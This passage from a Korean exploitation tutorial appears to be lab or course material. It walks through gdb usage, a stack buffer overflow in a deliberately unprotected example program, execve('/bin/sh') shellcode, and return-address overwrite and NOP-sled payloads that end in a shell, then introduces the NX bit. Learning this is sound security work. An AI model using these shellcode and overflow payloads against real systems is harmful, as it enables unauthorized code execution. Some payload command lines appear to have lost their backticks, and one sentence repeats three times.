ecx            0x97b9e553	-1749424813
edx            0x1	1
ebx            0x0	0
esp            0xffffd5dc	0xffffd5dc
ebp            0xffffd5e8	0xffffd5e8
esi            0xf7fb2000	-134537216
edi            0xf7fb2000	-134537216
eip            0x804842e	0x804842e <main+35>
eflags         0x206	[ PF IF ]
cs             0x23	35
ss             0x2b	43
ds             0x2b	43
es             0x2b	43
fs             0x0	0
gs             0x63	99
(gdb) 
```

eip 레지스터가 0x804842e인 것으로 보아 브레이크포인트를 설정했던 위치에서 실행이 멈춘 것을 확인할 수 있습니다.

레지스터나 변수의 값을 출력시켜주는 print (p) 명령어를 이용해 val1 + val2의 결과가 저장되어 있는 eax 레지스터의 값을 출력해보겠습니다.

```
(gdb) p $eax
$1 = 3
(gdb) 
```
eax 레지스터에 3이 저장되어 있는 것을 볼 수 있습니다.


0x8048439 주소에 브레이크포인트를 설정해 printf 함수의 인자들을 살펴보도록 하겠습니다.

프로세스가 멈추어있는 상태에서 프로세스를 이어서 실행시켜 주는 명령어는 continue (c)입니다. 만약 브레이크포인트가 설정되어 있다면 다음 브레이크포인트 지점까지 프로세스를 실행시킵니다.

```
(gdb) b*0x8048439
Breakpoint 2 at 0x8048439
(gdb) c
Continuing.
Breakpoint 2, 0x08048439 in main ()
(gdb) 
```

다음으로 스택 메모리를 살펴보겠습니다. x 명령어를 사용하면 인자로 주어진 주소의 메모리를 볼 수 있습니다.

x 명령어는 또한 출력 타입을 지정해줄 수 있습니다. 우선 esp 레지스터의 메모리를 word 타입으로 2개만큼(x/2wx) 출력해보도록 하겠습니다.


```
(gdb) x/2wx $esp
0xffffd544:	0x080484d0	0x00000003
```

x86 아키텍처의 호출 규약에 의해, printf 함수가 호출되는 시점의 스택 메모리에 함수의 인자들이 순서대로 저장되어 있는 것을 볼 수 있습니다.

첫 번째 인자인 1 + 2 = %d\n 문자열의 주소 0x80484d0을 문자열 형태로(x/s) 출력해보겠습니다.

```
(gdb) x/s 0x080484d0
0x80484d0:	"1 + 2 = %d\n"
(gdb) 
```

마지막으로 함수의 다음 인스트럭션까지 실행해주는 nexti (ni) 명령어를 이용해 printf 함수를 실행해보겠습니다.

```
(gdb) x/i $eip
=> 0x8048439 <main+46>:	call   0x80482e0 <printf@plt>
(gdb) ni
1 + 2 = 3
0x0804843e in main ()
(gdb) x/i $eip
=> 0x804843e <main+51>:	add    esp,0x8
(gdb) 
```
printf 함수가 실행되어 "1 + 2 = 3" 문자열이 출력되었습니다.

## Process Attach

```
//gcc -o read_write read_write.c -m32
//read_write.c
#include <stdio.h>
int main(void){
  char buf[64] = {};
  printf("Input : ");
  scanf("%63s", buf);
  printf("Your input : %s", buf);
  
}
```


gdb를 이용하면 실행중인 프로세스를 디버깅할 수 있습니다. read_write는 사용자의 입력을 받아 문자열을 출력해주는 프로그램입니다.


```
$ ./read_write
Input : abcd1234
Your input : abcd1234
```

gdb에 -p PID 혹은 --pid=PID를 인자로 전달하면 PID에 해당하는 프로세스에 gdb를 attach할 수 있습니다.

우선, read_write를 실행하여 실행 중인 프로세스의 PID를 알아보겠습니다. 실행 중인 프로세스의 PID를 확인하는 방법은 여러 가지가 있습니다. 첫 번째 방법은 ps 프로그램을 이용하는 방법입니다.

```
$ ./read_write
Input : 
```

read_write 바이너리를 실행한 후, 아래와 같이 read_write 프로세스의 PID(50353)를 구할 수 있습니다.

```
$ ps -aux | grep read_write
theori    50353  0.0  0.0   2204   520 pts/28   S+   21:50   0:00 ./read_write
```

두 번째 방법은 pidof나 pgrep 프로그램을 사용하여 프로세스의 PID를 구하는 것입니다.

pidof나 pgrep의 인자로 바이너리 이름을 전달하면 아래와 같이 해당 바이너리의 PID를 구할 수 있습니다.

```
$ pidof read_write
50353
$ pgrep read_write
50353
```

구한 PID를 이용해 gdb 프로세스 디버깅을 해보도록 하겠습니다.

```
$ ./read_write
Input : 
```

프로세스가 사용자의 입력을 받기 위해 실행 대기중일 때, 아래와 같이 gdb를 프로세스에 attach시켰습니다.


```
# gdb -q -p 50353
Attaching to process 50353
Reading symbols from /Linux_Exploitation_Mitigation/read_write...(no debugging symbols found)...done.
Reading symbols from /lib/i386-linux-gnu/libc.so.6...(no debugging symbols found)...done.
Reading symbols from /lib/ld-linux.so.2...(no debugging symbols found)...done.
0xf7f8ffd9 in __kernel_vsyscall ()
...
(gdb)
```

scanf 함수가 호출된 이후인 0x804850a 주소에 브레이크포인트를 설정해 입력한 데이터를 메모리에서 확인해보도록 하겠습니다.

```
(gdb) b *0x0804850a
Breakpoint 1 at 0x804850a
(gdb) c
Continuing.
```

```
$ ./read_write
Input : abcd1234
```

```
Breakpoint 1, 0x0804850a in main ()
(gdb) x/4wx $ebp-0x4c
0xffaf0acc:	0x64636261	0x34333231	0x00000000	0x00000000
(gdb) 
```

입력한 문자열 "abcd1234"가 buf의 주소인 0xffaf0acc 주소에 저장되어 있는 것을 확인할 수 있습니다.

이것으로 gdb의 간단한 사용법에 대해 알아보았습니다.

gdb에는 실습에서 사용한 명령어 이외에도 수많은 명령어들이 존재합니다. gdb는 앞으로 배울 코스에서 자주 사용되는 툴이기 때문에 스스로 만든 예제 파일 혹은 실습 파일을 이용해 꼭 익숙해지기 바랍니다.

```
명령어 설명
info functions	함수의 이름과 주소를 출력	
disassemble main	main 함수의 디스어셈블리를 출력	
break	주소에 breakpoint를 설정	
info breakpoints	breakpoint 정보 출력	
run	프로그램을 처음부터 실행	
display	매 실행 시 인자로 전달된 값을 출력	
continue	다음 브레이크포인트까지 실행	
si	step instruction, 명령어 1개 실행	
finish	현재 함수를 모두 실행	
info register	레지스터 정보 출력	
x/	지정된 메모리 영역을 특정 단위로 표현	
p	print, 인자로 전달된 값을 출력	
delete [break number]	브레이크포인트 번호에 해당하는 브레이크포인트 삭제	
quit	gdb 종료
```

# RET Overwrite (Return Address Overwrite)

## Introduction to RET Overwrite Exploitation

이 장에서는 스택 버퍼 오버플로우 취약점을 공격하는 방법에 대해 배워보도록 하겠습니다.

메모리 보호 기법이 없는 경우부터 시작하여, 메모리 보호 기법의 등장과 우회 방법에 대해 순서대로 알아보겠습니다.

스택 버퍼 오버플로우 취약점이 있을 때에는 주로 스택의 리턴 주소를 덮는 공격을 합니다. 리턴 주소는 함수가 끝나고 돌아갈 이전 함수의 주소로, 스택에 저장된 리턴 주소를 다른 값으로 바꾸면 실행 흐름을 조작할 수 있습니다.

RET Overwrite Exploitation에서는 리턴 주소를 덮어 실행 흐름을 조작해 공격자가 원하는 코드를 실행하는 방법에 대해 배울 수 있습니다.


## 스택 오버플로우

```
// gcc -o example1 example1.c -fno-stack-protector -z execstack -mpreferred-stack-boundary=2 -m32
#include <stdio.h>
int vuln(char *src) {
  
  char buf[32] = {};
  
  strcpy(buf, src);
  return 0;
}
int main(int argc, char *argv[], char *environ[]) {
  if (argc < 2){
    exit(-1);
  }
  vuln(argv[1]);
  return 0;
}
//example1.c
```

example1.c에서는 프로그램의 argv[1]을 vuln 함수의 인자로 전달합니다.

vuln 함수에서는 src 버퍼를 buf 버퍼에 strcpy 함수를 이용해 복사합니다.

strcpy 함수는 피복사 버퍼에 대한 길이 검증이 없기 때문에, 프로그램의 첫 번째 인자에 buf 배열의 크기보다 긴 문자열을 넣으면 스택 버퍼 오버플로우가 발생합니다.

이때의 vuln 함수의 메모리 구조는 다음과 같습니다.

![](https://i.imgur.com/kbt8Kkg.png)


x86 아키텍처 호출 규약에 의해 vuln 함수가 호출되면 vuln 함수의 인자인 src 문자열 포인터가 스택에 먼저 쌓입니다. 이후 vuln함수의 리턴 주소가 쌓이고, 함수의 프롤로그에서 ebp 레지스터를 저장한 다음 지역 변수의 공간을 할당합니다.

취약점이 존재하는 vuln 함수에 브레이크포인트를 설정한 후 첫 번째 인자와 함께 example1 바이너리를 실행해 보겠습니다. 브레이크포인트에서의 스택 메모리를 보면, 첫 4 바이트는 vuln 함수의 리턴 주소이고 다음 4 바이트는 vuln 함수의 인자인 argv[1]의 주소임을 알 수 있습니다.

```
(gdb) p vuln
$1 = {<text variable, no debug info>} 0x804843b <vuln>
(gdb) b*0x804843b
Breakpoint 1 at 0x804843b
(gdb) r aaaabbbbccccdddd
Starting program: ~/example1 aaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllll
Breakpoint 1, 0x0804843b in vuln ()
(gdb) x/2wx $esp
0xffffd520:	0x08048494	0xffffd74a
(gdb) x/i 0x08048494
   0x8048494 <main+30>:	add    $0x4,%esp
(gdb) x/s 0xffffd74a
0xffffd74a:	"aaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllll"
(gdb) 
(gdb) disas vuln
Dump of assembler code for function vuln:
   0x0804843b <+0>:	push   ebp
   0x0804843c <+1>:	mov    ebp,esp
   0x0804843e <+3>:	sub    esp,0x20
   0x08048441 <+6>:	mov    ecx,0x0
   0x08048446 <+11>:	mov    eax,0x20
   0x0804844b <+16>:	and    eax,0xfffffffc
   0x0804844e <+19>:	mov    edx,eax
   0x08048450 <+21>:	mov    eax,0x0
   0x08048455 <+26>:	mov    DWORD PTR [ebp+eax*1-0x20],ecx
   0x08048459 <+30>:	add    eax,0x4
   0x0804845c <+33>:	cmp    eax,edx
   0x0804845e <+35>:	jb     0x8048455 <vuln+26>
   0x08048460 <+37>:	push   DWORD PTR [ebp+0x8]
   0x08048463 <+40>:	lea    eax,[ebp-0x20]
   0x08048466 <+43>:	push   eax
   0x08048467 <+44>:	call   0x8048300 <strcpy@plt>
   0x0804846c <+49>:	add    esp,0x8
   0x0804846f <+52>:	mov    eax,0x0
   0x08048474 <+57>:	leave  
   0x08048475 <+58>:	ret  
End of assembler dump.
(gdb) 

```

이제 strcpy 함수가 실행되기 직전에 브레이크포인트를 설정해 인자들을 살펴보겠습니다.

스택을 살펴보면 첫 번째 인자인 buf 주소와 두 번째 인자인 argv[1]의 주소가 저장되어 있는 것을 볼 수 있습니다.

```
(gdb) x/20i vuln
=> 0x804843b <vuln>:	push   ebp
   ...
   0x8048467 <vuln+44>:	call   0x8048300 <strcpy@plt>
   ...
(gdb) b *0x8048467
Breakpoint 2 at 0x8048467
(gdb) c
Continuing.
Breakpoint 2, 0x08048467 in vuln ()
(gdb) x/2wx $esp
0xffffd4f4:	0xffffd4fc	0xffffd74a
```



strcpy 함수를 실행해 보겠습니다.

strcpy 함수의 첫 번째 인자인 buf(0xffffd4fc) 에 argv[1] 의 문자열이 복사된 것을 볼 수 있습니다.

argv[1]에 buf의 길이인 32 바이트보다 긴 문자열을 주었기 때문에 vuln의 리턴 주소가 저장된 0xffffd520 너머까지 argv[1] 문자열이 복사된 것을 확인할 수 있습니다.



```

(gdb) ni
0x0804846c in vuln ()
(gdb) x/20wx 0xffffd4fc
0xffffd4fc:	0x61616161	0x62626262	0x63636363	0x64646464
0xffffd50c:	0x65656565	0x66666666	0x67676767	0x68686868
0xffffd51c:	0x69696969	0x6a6a6a6a	0x6b6b6b6b	0x6c6c6c6c
0xffffd52c:	0xf7e1b600	0x00000002	0xffffd5c4	0xffffd5d0
0xffffd53c:	0x00000000	0x00000000	0x00000000	0xf7fb5000
(gdb) 
```

### RET Oversrite

x86 아키텍처의 ret 명령어는 esp 레지스터가 가리키고 있는 주소에 저장된 값으로 점프하는 명령어입니다.

vuln 함수가 리턴할 때의 esp 레지스터가 가리키고 있는 주소에는 0x6a6a6a6a가 저장되어 있습니다. 이후 ret 명령어가 실행되면 eip 레지스터는 0x6a6a6a6a가 됩니다.



```
(gdb) x/i 0x8048475
   0x8048475 <vuln+58>:	ret    
(gdb) b*0x8048475
Breakpoint 3 at 0x8048475
(gdb) c
Continuing.
Breakpoint 3, 0x08048475 in vuln ()
(gdb) x/wx $esp
0xffffd520:	0x6a6a6a6a
(gdb) 
```


```
(gdb) x/i $eip
=> 0x8048475 <vuln+58>:	ret    
(gdb) si
0x6a6a6a6a in ?? ()
(gdb) print $eip
$1 = (void (*)()) 0x6a6a6a6a
(gdb) 
```


스택 버퍼 오버플로우 취약점을 통해 프로그램 실행 흐름이 조작되었습니다. eip 레지스터를 임의의 값으로 바꿀 수 있기 때문에 원하는 주소의 코드를 실행할 수 있습니다.

Linux Exploitation은 로컬 환경의 타겟을 대상으로 하기 때문에 익스플로잇 최종 목표는 프로그램의 실행 흐름을 조작하여 /bin/sh 혹은 셸 바이너리를 실행하는 것입니다.

셸은 커맨드 라인의 명령어, 혹은 스크립트를 받아 서버에서 그에 맞는 기능을 실행시켜주는 프로그램입니다. 이렇듯 프로그램의 흐름을 조작해 셸을 실행하는 이유는, 권한 상승이나 본래의 프로그램이 의도치 않은 행위를 하기 위해서 입니다. 취약점이 존재하는 바이너리를 익스플로잇하여 셸 프로그램을 실행하면 해당 바이너리 권한의 셸을 획득하여 서버에 임의의 명령어를 실행할 수 있게 됩니다.



## 셸 코드

eip 레지스터 값을 바꿔 원하는 주소의 기계어 코드를 실행할 수 있게 되었습니다.

공격자가 /bin/sh 혹은 셸 바이너리를 실행하는 기계어 코드를 실행한다면, 셸에서 제공하는 여러 명령어들을 실행할 수 있게 됩니다.

example1 바이너리에서 /bin/sh 바이너리를 실행시키는 기계어 코드를 만들어 보겠습니다.

리눅스에서는 바이너리를 실행시키기 위해서 execve 시스템 콜을 사용합니다.

execve 시스템 콜의 인자는 다음과 같습니다.

```
execve syscall
syscall number(eax register) - 0xb(11)
1st argument(ebx register) – pathname
2nd argument(ecx register) – argv[]
3rd argument(edx register) – envp[]
```

pathname에는 실행시킬 바이너리의 경로, argv는 프로그램의 인자 포인터 배열, envp에는 프로그램의 환경변수 포인터 배열이 요구됩니다.


단순히 /bin/sh 바이너리를 실행시키는 것이 목적이기 때문에 최종적으로는 다음 인자 형태의 execve 시스템 콜을 호출하면 됩니다.

sys_execve("/bin/sh" 주소, NULL, NULL)

그럼 sys_execve("/bin/sh" 주소, NULL, NULL)를 호출하는 기계어 코드를 만들어 보겠습니다.

먼저, sys_execve("/bin/sh" 주소, NULL, NULL)를 실행하는 어셈블리 코드를 만듭니다.

다음으로, 만들어진 어셈블리 코드를 기계어 코드로 바꿉니다.

이 기계어 코드는 x86 리눅스 아키텍처의 어느 바이너리에서 실행시켜도 항상 /bin/sh 바이너리를 실행시키는 기능을 하고, 이를 셸코드라고 부릅니다.


### 어셈블리 코드-shellcode.asm

```
section .text
global _start
_start
xor    eax, eax
push   eax
push   0x68732f2f
push   0x6e69622f  #bin/sh 문자열을 저장
mov    ebx, esp
xor    ecx, ecx
xor    edx, edx
mov    al, 0xb
int    0x80
```


### 어셈블리 코드를 기계어로 변환-shellcode.o

```
$ sudo apt-get install nasm  #nasm 설치
$ nasm -f elf shellcode.asm
$ objdump -d shellcode.o
shellcode.o:     file format elf32-i386
Disassembly of section .text:
00000000 <_start>:
   0:	31 c0                	xor    %eax,%eax
   2:	50                   	push   %eax
   3:	68 2f 2f 73 68       	push   $0x68732f2f
   8:	68 2f 62 69 6e       	push   $0x6e69622f
   d:	89 e3                	mov    %esp,%ebx
   f:	31 c9                	xor    %ecx,%ecx
  11:	31 d2                	xor    %edx,%edx
  13:	b0 0b                	mov    $0xb,%al
  15:	cd 80                	int    $0x80
$ 
```

### 기계어 코드 - shellcode.b

```
$ objcopy --dump-section .text=shellcode.bin shellcode.o
$ xxd shellcode.bin
00000000: 31c0 5068 2f2f 7368 682f 6269 6e89 e331  1.Ph//shh/bin..1
00000010: c931 d2b0 0bcd 80                        .1.....
$ 
```


## RET Overwrite Exploitation
![](https://i.imgur.com/XZ9bnXH.png)


만들어진 셸코드를 example1 프로그램의 인자로 전달하면 셸코드가 스택 메모리에 저장됩니다.

다음으로 vuln 함수의 리턴 주소를 스택에 저장된 셸코드의 주소로 바꾸어 보겠습니다.

오른쪽의 디버깅 결과를 보면 eip 레지스터의 값이 0x6a6a6a6a로 바뀌었고, 이는 argv[1]의 36 번째 오프셋이였습니다.

리턴 주소가 저장된 스택 메모리를 덮기까지 남은 36바이트의 위치에 셸코드를 위치시키고, 리턴 주소를 저장된 셸코드 주소로 바꾸는 공격 코드를 만들어 보겠습니다.


```
(gdb) disas vuln
Dump of assembler code for function vuln:
   0x0804843b <+0>:	push   ebp
   0x0804843c <+1>:	mov    ebp,esp
   ...
   0x08048474 <+57>:	leave  
   0x08048475 <+58>:	ret   
End of assembler dump.
(gdb) b *0x8048475
Breakpoint 1 at 0x8048475
(gdb) r aaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllll
Starting program: ~/example1 aaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllll
Breakpoint 1, 0x08048475 in vuln ()
(gdb) x/i $eip
=> 0x8048475 <vuln+58>:	ret    
(gdb) x/wx $esp
0xffffd5b0:	0x6a6a6a6a
(gdb) 
```


셸코드의 주소를 확인하기 위해 argv[1]에 40 바이트 길이의 문자열을 넣어 example1 바이너리를 실행하고, strcpy 함수를 호출하는 주소에 브레이크포인트를 설정해 디버깅해보겠습니다.

strcpy 함수의 첫 번째 인자는 buf(0xffffd4fc)이므로 strcpy 함수가 실행된 이후 셸코드는 0xffffd4fc에 저장됩니다.

```
(gdb) b *0x8048467
Breakpoint 1 at 0x8048467
(gdb) r AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Starting program: ~/example1 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Breakpoint 1, 0x08048467 in vuln ()
(gdb) x/2wx $esp
0xffffd4f4:	0xffffd4fc	0xffffd752
(gdb) 
```

셸코드의 길이는 23 바이트이므로 공격코드는 다음과 같이 구성됩니다.


```
셸코드 + 임의의 13바이트 + 0xffffd4fc
"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80" + "\x90”*13 + “\xfc\xd4\xff\xff”
```

이 공격 코드를 argv[1]에 넣어 프로그램을 실행해 보겠습니다.

리턴 주소가 셸코드 주소로 바뀌어 셸이 실행되는 것을 볼 수 있습니다.


**셸 실행하기**
```
$ gdb -q ./example1
Reading symbols from ./example1...(no debugging symbols found)...done.
(gdb) r python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80"+"A"*13+"\xfc\xd4\xff\xff"'
Starting program: ~/example1 python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80"+"A"*13+"\xfc\xd4\xff\xff"'
```

이제 만들어진 공격 코드를 gdb가 아닌 셸 환경에서 실행해 보겠습니다.

```
$ ./example1 python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80"+"A"*13+"\xfc\xd4\xff\xff"'
[1]    88636 segmentation fault (core dumped)  ./example1 
$ 
```

셸을 획득하지 못 하고 프로그램이 비정상 종료되었습니다.

위 익스플로잇 코드에서는 리턴 주소를 스택에 있는 셸코드의 주소로 덮습니다. 하지만 익스플로잇이 제대로 동작하지 않은 이유는 스택의 셸코드의 주소가 바뀌었기 때문입니다.

프로그램을 다른 환경에서 실행시킬 때 지역 변수의 주소는 스택 끝에 존재하는 프로그램의 인자와 환경변수에 따라 변합니다.

![](https://i.imgur.com/RBVExvh.png)

본 예시의 gdb와 셸에서의 지역 변수 주소가 다른 이유는 argv[0] 문자열, 즉 실행 파일의 경로가 각각 절대 경로와 상대 경로로 다르기 때문입니다.



```
// binary.c
#include <stdio.h>
int main(int argc, char *argv[1]){
  printf("argv[0] : %s\n", argv[0]);
}
```

```
$ ./binary
argv[0] : ./binary
$ gdb -q ./binary
Reading symbols from ./binary...(no debugging symbols found)...done.
(gdb) r
Starting program: /Linux_Exploitation_Mitigation/binary 
argv[0] : /Linux_Exploitation_Mitigation/binary
[Inferior 1 (process 35158) exited normally]
(gdb) 
```


gdb는 프로그램을 실행할 때 실행 파일의 절대경로를 argv[0]에 저장하지만, 셸에서 프로그램을 실행할 때는 사용자가 입력한 경로가 argv[0]에 저장됩니다.

그렇기 때문에 스택 주소에 약간의 오차가 생겨도 익스플로잇이 성공할 수 있도록 공격 코드를 수정할 필요가 있습니다.

다음 장에서는 이러한 문제점을 해결하는 방법을 배울 수 있습니다.



# NOP Sled


![](https://i.imgur.com/jvMgYuj.png)


NOP은 "No OPeration"의 약자로, 명령어 중의 하나입니다. NOP은 xchg eax, eax와 같이 프로그램의 실행에 영향을 주지 않는 명령어이기 때문에, 프로그램이 실행 중에 NOP 명령어를 만나면 다음 명령어로 넘어가는 것과 같은 효과를 줍니다. NOP은 주로 명령어의 주소 alignment를 맞출 때 사용됩니다.

x86 아키텍처의 NOP 명령어 바이트코드는 0x90입니다.

NOP Sled, 혹은 NOP Slide는 주로 셸코드의 주소를 정확히 알아내기 힘들 경우 큰 메모리를 확보하여 셸코드 주소의 오차 범위를 크게 만들 때 사용합니다.

예를 들어, 0x100 주소에 셸코드가 저장되어 있다고 가정해 보겠습니다. 만약 NOP Sled가 없다면 정확히 0x100 주소로 실행 흐름을 바꿔야 셸코드가 실행됩니다. 하지만 셸코드 앞에 0x10000바이트의 NOP Sled를 붙인다면 0x100 ~ 0x10100 주소 중 임의의 주소로 실행 흐름을 바꾸기만 하면 됩니다. NOP Sled의 어딘가의 주소를 알아내 달라진 환경에서 해당 주소로 실행 흐름을 바꾸는 경우 평균적으로 0x10000/2만큼의 주소 오차가 허용됩니다.

NOP Sled는 이렇듯 썰매처럼 다음 명령어로 넘어가는 NOP 명령어의 특징 때문에 생긴 이름입니다. 이는 익스플로잇 확률을 올리는 데 큰 도움이 됩니다.




### Exploitation Using NOP Sled

이제 NOP Sled를 이용해 새로운 공격 코드를 만들어 봅시다.

10000 바이트의 NOP Sled가 포함된 셸코드를 example1의 argv[1]에 넣은 후 gdb를 이용해 NOP Sled의 중간 지점의 주소를 찾아보도록 하겠습니다.


```
$ gdb -q ./example1
Reading symbols from ./example1...(no debugging symbols found)...done.
(gdb) disas vuln
Dump of assembler code for function vuln:
   0x0804843b <+0>:	push   ebp
   0x0804843c <+1>:	mov    ebp,esp
   0x0804843e <+3>:	sub    esp,0x20
   0x08048441 <+6>:	mov    ecx,0x0
   0x08048446 <+11>:	mov    eax,0x20
   0x0804844b <+16>:	and    eax,0xfffffffc
   0x0804844e <+19>:	mov    edx,eax
   0x08048450 <+21>:	mov    eax,0x0
   0x08048455 <+26>:	mov    DWORD PTR [ebp+eax*1-0x20],ecx
   0x08048459 <+30>:	add    eax,0x4
   0x0804845c <+33>:	cmp    eax,edx
   0x0804845e <+35>:	jb     0x8048455 <vuln+26>
   0x08048460 <+37>:	push   DWORD PTR [ebp+0x8]
   0x08048463 <+40>:	lea    eax,[ebp-0x20]
   0x08048466 <+43>:	push   eax
   0x08048467 <+44>:	call   0x8048300 <strcpy@plt>
   0x0804846c <+49>:	add    esp,0x8
   0x0804846f <+52>:	mov    eax,0x0
   0x08048474 <+57>:	leave  
   0x08048475 <+58>:	ret    
End of assembler dump.
(gdb) b *0x08048467
Breakpoint 1 at 0x8048467
(gdb) r python -c 'print "A"*36+"RETN"+"\x90"*100000+"SHELLCODE"'
Starting program: ~/example1 python -c 'print "A"*36+"RETN"+"\x90"*100000+"SHELLCODE"'
Breakpoint 1, 0x08048467 in vuln ()
(gdb) x/2wx $esp
0xfffe4e54:	0xfffe4e5c	0xfffe50a9
(gdb) x/40wx 0xfffe50a9
0xfffe50a9:	0x41414141	0x41414141	0x41414141	0x41414141
0xfffe50b9:	0x41414141	0x41414141	0x41414141	0x41414141
0xfffe50c9:	0x41414141	0x4e544552	0x90909090	0x90909090
0xfffe50d9:	0x90909090	0x90909090	0x90909090	0x90909090
0xfffe50e9:	0x90909090	0x90909090	0x90909090	0x90909090
0xfffe50f9:	0x90909090	0x90909090	0x90909090	0x90909090
0xfffe5109:	0x90909090	0x90909090	0x90909090	0x90909090
0xfffe5119:	0x90909090	0x90909090	0x90909090	0x90909090
0xfffe5129:	0x90909090	0x90909090	0x90909090	0x90909090
0xfffe5139:	0x90909090	0x90909090	0x90909090	0x90909090
(gdb) 
```



vuln 함수에서 strcpy 함수를 호출하는 시점에 브레이크포인트를 설정해 복사 버퍼인 argv[1]의 주소인 0xfffe50a9를 알아내었습니다.

다음으로 NOP Sled 중간 지점의 주소(argv1 + 50000)를 계산해 보겠습니다.


```
(gdb) p/x 0xfffe50a9 + 50000
$3 = 0xffff13f9
(gdb) 
```

NOP Sled 중간 지점 주소는 0xffff13f9입니다. 이 주소를 이용한 새로운 공격 코드는 아래와 같이 구성할 수 있습니다.



```
"A" * 36 + 0xffff13f9 + "\x90" * 100000 + shellcode
```

만들어진 공격 코드를 이용해 익스플로잇을 시도해 보겠습니다.만들어진 공격 코드를 이용해 익스플로잇을 시도해 보겠습니다.만들어진 공격 코드를 이용해 익스플로잇을 시도해 보겠습니다.

```
$ ./example1 python -c 'print "A"*36 + "\xf9\x13\xff\xff" + "\x90"*100000 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80"'
$ id
uid=1001(theori) gid=1001(theori) groups=1001(theori)
$ 
```


성공적으로 셸이 실행.


# NX bit의 등장

앞에서는 프로그램의 취약점을 이용해 실행 흐름을 조작한 뒤 스택 영역에 저장된 셸코드를 실행하였습니다.

하지만 일반적인 프로그램에서의 스택 메모리는 코드를 실행하는 용도로 사용되는 것이 아니라, 일시적으로 데이터를 읽고 쓰는 데 사용되기 때문에 실행 권한이 있을 필요가 없습니다. 이러한 이유로 프로그램의 공격을 어렵게 하기 위해, 메모리에 쓰기 권한과 실행 권한을 동시에 부여하지 않는 No-eXecute bit(NX bit)가 등장하였습니다.

example2.c는 셸코드를 데이터 영역에 저장한 후 main 함수에서 이를 실행하는 간단한 예제입니다. 서로 다른 컴파일 옵션을 통해 NX bit 보호 기법을 적용한 example2_nx 바이너리와 적용하지 않은 example_x 바이너리를 생성하였습니다.

example2_nx 바이너리와 example2_x 바이너리를 gdb로 디버깅하여 메모리 권한을 확인해 보도록 하겠습니다.

```
//gcc -o example2_x example2.c -fno-stack-protector -z execstack -mpreferred-stack-boundary=2 -m32
//gcc -o example2_nx example2.c -fno-stack-protector -mpreferred-stack-boundary=2 -m32
#include <stdio.h>
unsigned char code[] = \
"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80";
int main(void){
  void (*shellcode)() = (void(*)())code;
  
  printf("Executing shellcode\n");
  shellcode();
}
```


## NX bit가 적용되지 않은 example2_x의 메모리 맵

```
$ gdb -q ./example2_x
Reading symbols from ./example2_x...(no debugging symbols found)...done.
(gdb) b main
Breakpoint 1 at 0x8048411
(gdb) r
Starting program: ~/example2_x 
Breakpoint 1, 0x08048411 in main ()
(gdb) shell cat /proc/`pidof example2_x`/maps
08048000-08049000 r-xp 00000000 08:01 147398                             ~/example2_x
08049000-0804a000 r-xp 00000000 08:01 147398                             ~/example2_x
0804a000-0804b000 rwxp 00001000 08:01 147398                             ~/example2_x
…
fffdd000-ffffe000 rwxp 00000000 00:00 0                                  [stack]
(gdb) 
```

스택과 데이터 영역 모두 rwx, 즉 읽기, 쓰기, 실행 권한을 갖고 있습니다.

example2_x 바이너리를 실행했을 때는 정상적으로 셸코드가 실행되어 셸이 실행됩니다.


```
$ ./example2_x
Executing shellcode
$ id
uid=1001(theori) gid=1001(theori) groups=1001(theori) 
```


### NX bit가 적용된 example2_nx의 메모리 맵

```
$ gdb -q ./example2_nx
Reading symbols from ./example2_nx...(no debugging symbols found)...done.
(gdb) b main
Breakpoint 1 at 0x8048411
(gdb) r
Starting program: ~/example2_nx 
Breakpoint 1, 0x08048411 in main ()
(gdb) shell cat /proc/`pidof example2_nx`/maps
08048000-08049000 r-xp 00000000 08:01 147400                             ~/example2_nx
08049000-0804a000 r--p 00000000 08:01 147400                             ~/example2_nx
0804a000-0804b000 rw-p 00001000 08:01 147400                             ~/example2_nx
…
fffdd000-ffffe000 rw-p 00000000 00:00 0                                  [stack]
(gdb) 
```

스택과 데이터 영역 영역 메모리 모두 rw, 즉 읽기, 쓰기 권한만을 갖고 있습니다.

example2_nx 바이너리를 실행했을 때는 데이터 영역에 실행 권한이 없기 때문에 Sementation Fault가 발생합니다.

```
$ ./example2_nx
Executing shellcode
[1]    104735 segmentation fault (core dumped)  ./example2_nx
$
```


## Bypassing NX Bit


NX bit가 설정되어 있을 경우에는 쓰기 권한과 실행 권한이 동시에 있는 메모리 영역이 존재하지 않습니다. 그래서 example1 예제에서와 같이 셸코드를 스택 메모리에 저장해 실행 흐름을 스택으로 바꾸는 공격은 더 이상 사용할 수 없습니다. 공격자의 코드를 메모리에 저장할 수 없기 때문에 실행 권한이 있는 영역에 존재하는 코드만을 사용하여야 합니다.

프로그램에 스택 버퍼 오버플로우가 존재한다면, 실행 흐름을 임의의 주소로 바꾸는 것은 여전히 가능합니다. NX bit가 적용되어 있는 상황에서 스택 메모리 등으로 실행 흐름을 직접 바꾸어 공격하는 것은 불가능하기 때문에, 앞서 설명한 것처럼 메모리의 실행 가능한 영역에 있는 코드들을 활용해서 익스플로잇해야 합니다. C언어에서 printf와 같은 라이브러리 함수가 사용될 때, 프로그램은 메모리에 로딩된 라이브러리 파일에서 호출된 함수의 주소를 찾아 실행합니다. 그러므로 프로그램에서 호출된 함수 이외에 system과 같이 익스플로잇에 유용한 함수 코드들도 함께 로딩됩니다.

